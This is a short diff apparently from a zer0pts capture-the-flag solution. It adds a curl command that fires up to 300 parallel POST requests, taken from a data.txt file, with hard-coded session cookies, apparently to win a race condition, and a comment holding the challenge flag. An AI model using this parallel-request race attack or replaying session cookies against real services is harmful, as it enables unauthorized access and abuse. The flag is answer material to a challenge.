@@ -1,0 +1,2 @@
+curl --parallel --parallel-immediate --parallel-max 300 --config data.txt -s -X POST -s -H 'Cookie: session=eyJjc3JmX3Rva2VuIjoiNThiMGIyZTRhYWI3OGVkZDJhZTNlY2NiZjkzZDUwNDJlMmZiY2Y2NyJ9.ZLJtcw.AUHMXdtTw_dPcjcv-wrcaqhvFtc; connect.sid=s%3AoXK-Vc2ngXmzRYMA6L4oE2Iom3PE6WCG.oyZ0AFWFnOIgpgIkDIivkMjNz%2BoZEAwfDM9NMVqoXkc'
+# zer0pts{fire_ice_storm_di_acute_brain_damned_jugem_bayoen_bayoen_bayoen_10cefab0}
